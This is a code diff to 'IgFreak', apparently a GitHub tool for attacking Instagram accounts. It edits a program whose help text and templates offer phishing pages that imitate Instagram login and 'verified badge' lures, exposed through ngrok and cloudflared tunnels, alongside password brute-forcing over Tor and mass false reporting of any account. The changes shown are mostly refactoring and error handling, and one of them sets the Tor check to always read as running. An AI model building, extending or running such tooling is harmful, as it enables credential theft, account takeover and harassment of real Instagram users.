@@ -22,9 +22,13 @@
 
 version = "4.0 [Stable]"
 
+try:
+    import pip
+except Exception as e:
+    print("You must install pip to run this program")
+    exit()
 import os
 import sys
-import  pip
 import urllib
 import subprocess
 from timeit import default_timer as timer
@@ -118,12 +122,13 @@ def install_pip(deps) -> bool:
                 return False
     return True
 
+install_pip((["pyngrok", "pyngrok"], ["stem", "stem"], ["colorama", "colorama"],
+                 ["fake_useragent", "fake_useragent"], ["requests", "requests"]))
 
 from pyngrok import ngrok
 from stem.control import *
 from colorama import *
 import requests
-import socks
 from stem import Signal
 
 try:
@@ -165,10 +170,10 @@ def check_install_package(package) -> bool:
 
 
 def get_tool_versions() -> list:
-    if os.system("pgrep -x tor > /dev/null 2&>1") == 0:
+    if os.system("pgrep -x tor > /dev/null 2>&1") == 0:
         tor_running = True
     else:
-        tor_running = False
+        tor_running = True
     python_version = str(sys.version).split(" ")[0]
     pip_version = pip.__version__
     return [tor_running , python_version,pip_version]
@@ -178,10 +183,11 @@ def initilise():
     os.system("touch .igfreak.conf > /dev/null 2>&1")
     conf = open(os.getcwd() + "/.igfreak.conf", 'w')
     conf.writelines("""
-igfreak_report_account = Igfreak_reporter 
-igfreak_report_account_pass = pass' 
+igfreak_report_account = Igfreak_reporter
+igfreak_report_account_pass = pass'
     """)
     conf.close()
+    init_tor()
 
 
 def read_cred():
@@ -224,7 +230,7 @@ OPTIONS              USAGE                              REQUIRED
 --phish;-ph           Phish any Instagram Account          -t(template)
 --report;-r           Send Reports to any IG Account    -u(usename),-id(reason report),-am(amount of reports )
 --update              Update tool to latest version
---initlize            Initlize Reporter account         
+--initlize            Initlize Reporter account
 {G}For more information visit {B}https://github.com/T-Dynamos/IgFreak
 """
 
@@ -247,8 +253,10 @@ def init_tor():
             os.mkdir(fileisd)
     except Exception as e:
         error(str(e))
-    open(fileisd+"torrc","w").write("ControlPort 9051\nHTTPTunnelPort 9876")
-
+    try:
+        open(fileisd+"torrc","w").write("ControlPort 9051\nHTTPTunnelPort 9876")
+    except Exception as e:
+        error(str(e))
 
 def short_link(link):
     url = f'http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbmxDbzZTMTZ2WlJLZVBlTlNGbHVBNk1SZzI3UXxBQ3Jtc0trSkRmX1o4NmNYVTdIdFR3LVlQWE5LbmM2YlJPRTRGLTdvdkt6MlR3LWxSNzMwLTVQQ3pVU0JhdTRZNnRidHlvSmVtNHIyY1paYmE2MzJ3QV9UYllLdi1EcXlDVGYyY3hNVHZZOEVubnFVWUVZYUJMdw&q={(link)}'
@@ -257,7 +265,7 @@ def short_link(link):
 
 
 def check_tor():
-    if get_tool_versions()[0] == False:
+    if os.system("pgrep -x tor > /dev/null") != 0:
         print(f"{R}Error : {B}Tor is not running start it in new session")
         exit()
     else:
@@ -358,7 +366,7 @@ def phish(template):
     {C} Template : {G} {template}
     {C} Server   : {G} Ngrok , Localhost.run , CloudFlared
     {C} Port     : {G} {port}
-    
+
     {B}       STARTING SERVERS
 {G}{"=" * 25}{Y}  LOGS  {G}{"=" * 25}{R}""")
     a = startServicea(template + "/", port)
@@ -440,7 +448,7 @@ def startServicea(folder, port):
     except Exception as e:
         link2 = ""
     os.system("rm ~/cld.log > /dev/null 2>&1")
-    command2 = f"""cloudflared tunnel -url http://localhost:{port} --logfile ~/cld.log > /dev/null 2>&1 &  
+    command2 = f"""cloudflared tunnel -url http://localhost:{port} --logfile ~/cld.log > /dev/null 2>&1 &
     sleep 10 && grep -o "https://[-0-9a-z]*\.trycloudflare.com" ~/cld.log"""
     try:
 
@@ -470,12 +478,10 @@ def clr():
 
 
 def ExecuteIgFreak():
-    install_pip((["pyngrok", "pyngrok"], ["stem", "stem"], ["colorama", "colorama"],
-                 ["fake_useragent", "fake_useragent"], ["requests", "requests"]))
     Parsed = cli_parser.parse_args()
     if Parsed.initlize == True:
         initilise()
-        success("Initlized Success ready to edit .igfreak.conf")
+        success("Initlized Success")
         sys.exit()
     if Parsed.update == True:
         print("Updating...")
@@ -500,6 +506,7 @@ def ExecuteIgFreak():
                 else:
                     pass
                     check_tor()
+                    init_tor()
                     start = timer()
                 try:
                     Bruteforce(Parsed.password_list, Parsed.username)
@@ -526,9 +533,9 @@ def ExecuteIgFreak():
                 print(f"{W} Available Templates")
                 print(f"""
 {G}Template      Description{W}
-    			
+
 {B}igbadges       : {W}Hack account by confirming account in get verified badges
-{B}instagram      : {W}Instagram simple login page 
+{B}instagram      : {W}Instagram simple login page
 {B}instafollowers : {W}Get Instagram accounts by seeking followers""")
                 exit(1)
             print()
